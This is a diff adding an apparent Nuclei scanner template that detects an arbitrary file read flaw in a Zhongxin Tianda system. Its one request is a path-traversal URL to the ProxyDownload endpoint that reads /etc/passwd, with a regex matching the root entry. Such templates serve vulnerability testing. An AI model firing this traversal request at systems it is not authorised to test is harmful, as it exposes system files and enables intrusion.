@@ -1,0 +1,18 @@
+id: zxtd-ProxyDownload-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 中新天达系统存在任意文件读取漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/aexp/ProxyDownload?path=/speedec/webapps/webftp/../../../../etc/passwd"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
